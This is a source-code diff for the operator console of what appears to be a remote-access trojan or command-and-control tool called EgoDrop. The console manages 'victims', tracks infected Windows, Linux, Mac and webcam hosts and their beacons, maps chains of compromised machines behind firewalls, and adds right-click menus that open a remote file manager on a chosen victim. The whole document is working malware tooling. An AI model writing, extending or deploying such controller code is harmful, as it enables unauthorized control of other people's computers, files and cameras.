@@ -16,11 +16,11 @@ namespace EgoDrop
         {
             InitializeComponent();
 
-            m_sqlite = new clsSqlite("data.db"); //Sqlite object.
+            m_sqlite = new clsSqlite("data.db");    //Sqlite object.
             m_iniMgr = new clsIniMgr("config.ini"); //IniMgr object.
         }
 
-        #region FindVictim
+        #region Tools
 
         /// <summary>
         /// Obtain victim object from listviewitem object.
@@ -47,8 +47,9 @@ namespace EgoDrop
         /// <returns>Victim object.</returns>
         private string fnszGetVictimID(ListViewItem item) => item.SubItems[1].Text;
 
-        #endregion
+        private bool fnbIsUnixLike(ListViewItem item) => !item.SubItems[7].Text.ToLower().Contains("windows");
 
+        #endregion
         #region Logger
 
         /// <summary>
@@ -154,11 +155,26 @@ namespace EgoDrop
                                 case NetworkView.enMachineStatus.Linux_Super:
                                     networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Linux_Beacon);
                                     break;
+
                                 case NetworkView.enMachineStatus.Windows_Infected:
                                     networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
                                     break;
                                 case NetworkView.enMachineStatus.Windows_Super:
                                     networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
+                                    break;
+
+                                case NetworkView.enMachineStatus.Mac_Infected:
+
+                                    break;
+                                case NetworkView.enMachineStatus.Mac_Super:
+
+                                    break;
+
+                                case NetworkView.enMachineStatus.Webcam_Infected:
+
+                                    break;
+                                case NetworkView.enMachineStatus.Webcam_Super:
+
                                     break;
                             }
                         }
@@ -200,7 +216,7 @@ namespace EgoDrop
                 }
                 else if (lsMsg[0] == "disconnect")
                 {
-                    fnOnVictimDisconnected(ltn, victim, szSrcVictimID);
+                    fnOnVictimDisconnected(ltn, victim, lsMsg[1]);
                 }
             }));
         }
@@ -237,7 +253,7 @@ namespace EgoDrop
                 //Remove from listview.
                 foreach (ListViewItem item in listView1.Items)
                 {
-                    if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)))
+                    if (clsTools.fnbSameVictim(vic, fnGetVictimFromTag(item)) && string.Equals(item.SubItems[1].Text, szVictimID))
                     {
                         listView1.Items.Remove(item);
                         fnSysLog($"Offline[{szVictimID}]");
@@ -255,6 +271,8 @@ namespace EgoDrop
                 Node firewallNode = networkView1.FindNodeWithName($"Firewall@{vic.m_sktClnt.RemoteEndPoint}");
                 if (firewallNode.ChildNodes.Count == 0)
                     networkView1.RemoveNode(firewallNode);
+
+                vic.fnDeleteVictimChain(szVictimID);
             }));
         }
 
@@ -370,7 +388,7 @@ namespace EgoDrop
                             {
                                 var fireWall = networkView1.AddNode(szName, szName, NetworkView.enMachineStatus.Firewall);
                                 networkView1.AddConnection(fireWall, n1);
-                                networkView1.MoveNodeToLeft(fireWall);
+                                //networkView1.MoveNodeToLeft(fireWall);
                                 networkView1.BringGraphIntoView();
                             }
 
@@ -379,6 +397,8 @@ namespace EgoDrop
 
                         var nodeParent = networkView1.FindNodeWithID(lsVictim[i - 1]);
                         networkView1.AddConnection(nodeParent, n1);
+
+
                     }
                 }
                 catch (Exception ex)
@@ -466,7 +486,7 @@ namespace EgoDrop
                 frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szVictimID);
                 if (f == null)
                 {
-                    f = new frmFileMgr(szVictimID, victim);
+                    f = new frmFileMgr(szVictimID, victim, fnbIsUnixLike(item));
                     f.Show();
                 }
                 else
@@ -588,10 +608,14 @@ namespace EgoDrop
             if (victim == null)
                 return;
 
+            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
+            if (item == null)
+                return;
+
             frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szID);
             if (f == null)
             {
-                f = new frmFileMgr(szID, victim);
+                f = new frmFileMgr(szID, victim, fnbIsUnixLike(item));
                 f.Show();
             }
             else
@@ -611,6 +635,88 @@ namespace EgoDrop
         private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
         {
             treeView2.SelectedImageKey = treeView2.SelectedNode.ImageKey;
+        }
+
+        private void networkView1_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Right)
+            {
+                Node node = networkView1.SelectedNode;
+                if (node == null)
+                    return;
+
+                if (node.bIsWindows)
+                    networkView1.ContextMenuStrip = topoWinContextMenu;
+                else if (node.bIsLinux)
+                    networkView1.ContextMenuStrip = topoLinuxContextMenu;
+            }
+        }
+
+        private void listView1_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Right)
+            {
+                if (listView1.SelectedItems.Count == 0)
+                    return;
+
+                ListViewItem item = listView1.SelectedItems.Cast<ListViewItem>().First();
+
+                if (!fnbIsUnixLike(item))
+                    listView1.ContextMenuStrip = tWinContextMenu;
+                else
+                    listView1.ContextMenuStrip = tLinuxContextMenu;
+            }
+        }
+
+        private void toolStripMenuItem17_Click(object sender, EventArgs e)
+        {
+
+        }
+
+        private void toolStripMenuItem18_Click(object sender, EventArgs e)
+        {
+            foreach (ListViewItem item in listView1.SelectedItems)
+            {
+                string szVictimID = fnszGetVictimID(item);
+                clsVictim victim = fnGetVictimFromTag(item);
+                frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szVictimID);
+                if (f == null)
+                {
+                    f = new frmFileMgr(szVictimID, victim, fnbIsUnixLike(item));
+                    f.Show();
+                }
+                else
+                {
+                    f.BringToFront();
+                }
+            }
+        }
+
+        private void toolStripMenuItem16_Click(object sender, EventArgs e)
+        {
+            Node node = networkView1.SelectedNode;
+            if (node == null)
+                return;
+
+            string szID = node.szVictimID;
+            clsVictim victim = fnGetVictimWithID(szID);
+            if (victim == null)
+                return;
+
+            ListViewItem item = listView1.FindItemWithText(szID, true, 0);
+            if (item == null)
+                return;
+
+            frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szID);
+            if (f == null)
+            {
+                f = new frmFileMgr(szID, victim, fnbIsUnixLike(item));
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+            }
         }
     }
 }
